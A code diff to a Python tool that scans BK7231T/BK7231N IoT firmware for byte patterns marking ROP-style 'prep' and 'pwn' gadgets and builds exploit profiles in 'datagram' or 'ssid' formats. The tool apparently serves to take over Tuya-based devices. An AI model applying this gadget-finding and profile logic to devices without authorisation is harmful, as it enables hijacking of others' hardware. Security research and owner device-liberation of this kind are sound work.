@@ -160,7 +160,7 @@ def walk_app_code():
         # 1 match should be found
         # 04 1e 07 d1 11 9b 21 1c 00 is the byte pattern for mf_cmd_process execution
         # 3 matches, 2nd is correct
-        process_generic("BK7231T", 1, 1, "2b68301c9847", 1, 0, "041e07d1119b211c00", 3, 1)
+        process_generic("BK7231T", 1, "datagram", "2b68301c9847", 1, 0, "041e07d1119b211c00", 3, 1)
         return
 
     # Newer versions of BK7231T, BS 40.00, SDK 1.0.x
@@ -169,41 +169,32 @@ def walk_app_code():
         # 2 matches should be found, 1st is correct
         # a1 4f 06 1e is the byte pattern for mf_cmd_process execution
         # 1 match should be found
-        process_generic("BK7231T", 2, 1, "2368381c9847", 2, 0, "a14f061e", 1, 0)
+        process_generic("BK7231T", 2, "datagram", "2368381c9847", 2, 0, "a14f061e", 1, 0)
         return
 
     # Newest versions of BK7231T, BS 40.00, SDK 2.3.2
     if b'BY embed FOR ty_iot_sdk AT bk7231t' in appcode or b'BY ci_manage FOR ty_iot_sdk AT bk7231t' in appcode:
         # TODO: Figure out how to process this format
         raise RuntimeError("This device uses an unusual SDK and there is currently no pattern to mach it.")
-        #process_generic("BK7231T", 3, 1/2, "", 0, 0, "", 0, 0) # Uknown if payload_version is 1 or 2, more likely 2
+        #process_generic("BK7231T", 3, "datagram/ssid", "", 0, 0, "", 0, 0) # Uknown if payload_version is 1 or 2, more likely 2
         return
 
-    # Older (relatively, at least it existed first from sample data) version of BK7231N, BS 40.00, SDK 2.3.1
-    if b'embed FOR ty_iot_sdk AT bk7231n' in appcode:
+    # BK7231N, BS 40.00, SDK 2.3.1
+    if b'embed FOR ty_iot_sdk AT bk7231n' in appcode or b'FOR ty_iot_sdk_bk7231n AT bk7231n' in appcode or b'BY ci_manage FOR ty_iot_sdk_bk7231nl AT BK7231NL' in appcode:
         # 43 68 20 1c 98 47 is the byte pattern for intermediate addess entry (usually ty_cJSON_Parse)
         # 1 match should be found
         # 05 1e 00 d1 15 e7 is the byte pattern for mf_cmd_process execution
         # 1 match should be found
-        process_generic("BK7231N", 1, 2, "4368201c9847", 1, 0, "051e00d115e7", 1, 0)
+        process_generic("BK7231N", 1, "ssid", "4368201c9847", 1, 0, "051e00d115e7", 1, 0)
         return
 
-    # Newer (relatively, first build is after the "older" sdk) version of BK7231N, BS 40.00, SDK 2.3.1
-    if b'FOR ty_iot_sdk_bk7231n AT bk7231n' in appcode:
-        # 43 68 20 1c 98 47 is the byte pattern for intermediate addess entry (usually ty_cJSON_Parse)
-        # 1 match should be found
-        # 05 1e 00 d1 15 e7 is the byte pattern for mf_cmd_process execution
-        # 1 match should be found
-        process_generic("BK7231N", 2, 2, "4368201c9847", 1, 0, "051e00d115e7", 1, 0)
-        return
-
-    # Newest version of N, BS 40.00, SDK 2.3.3
+    # BK7231N, BS 40.00, SDK 2.3.3
     if b'ci_manage FOR ty_iot_sdk AT bk7231n' in appcode:
         # 43 68 20 1c 98 47 is the byte pattern for intermediate addess entry (usually ty_cJSON_Parse)
         # 1 match should be found
         # 05 1e 00 d1 fc e6 is the byte pattern for mf_cmd_process execution
         # 1 match should be found
-        process_generic("BK7231N", 3, 2, "4368201c9847", 1, 0, "051e00d1fce6", 1, 0)
+        process_generic("BK7231N", 2, "ssid", "4368201c9847", 1, 0, "051e00d1fce6", 1, 0)
         return
 
     raise RuntimeError('Unknown pattern, please open a new issue and include the bin.')
@@ -238,17 +229,17 @@ def process_generic(chipset, pattern_version, payload_version, intermediate_stri
     mf_cmd_process_addr = matcher.set_final_thumb_offset(mf_cmd_process_matches[mf_cmd_process_index])
     print(f"[+] Payload pwn gadget (THUMB): 0x{mf_cmd_process_addr:X}")
     
-    if payload_version == 1:
-        make_profile_format1(chipset, intermediate_addr, mf_cmd_process_addr)
+    if payload_version == "datagram":
+        make_profile_datagram(chipset, intermediate_addr, mf_cmd_process_addr)
         return
-    elif payload_version == 2:
-        make_profile_format2(chipset, intermediate_addr, mf_cmd_process_addr)
+    elif payload_version == "ssid":
+        make_profile_ssid(chipset, intermediate_addr, mf_cmd_process_addr)
         return
         
     raise RuntimeError("Unknown chipset, unable to generate profile, please open a new issue and include the bin.")
 
 # Used by nearly all BK7231T devices
-def make_profile_format1(chipset, intermediate_addr, mf_cmd_process_addr):
+def make_profile_datagram(chipset, intermediate_addr, mf_cmd_process_addr):
     profile_builder = ProfileBuilder()
     prep_gadget = intermediate_addr.to_bytes(3, byteorder="little")
     pwn_gadget = mf_cmd_process_addr.to_bytes(4, byteorder="little")
@@ -281,7 +272,7 @@ def make_profile_format1(chipset, intermediate_addr, mf_cmd_process_addr):
         f.write(f'{chipset}')
     
 # Used by nearly all BK7231N devices
-def make_profile_format2(chipset, intermediate_addr, mf_cmd_process_addr):
+def make_profile_ssid(chipset, intermediate_addr, mf_cmd_process_addr):
     profile_builder = ProfileBuilder()
     prep_gadget = intermediate_addr.to_bytes(3, byteorder="little")
     pwn_gadget = mf_cmd_process_addr.to_bytes(3, byteorder="little")
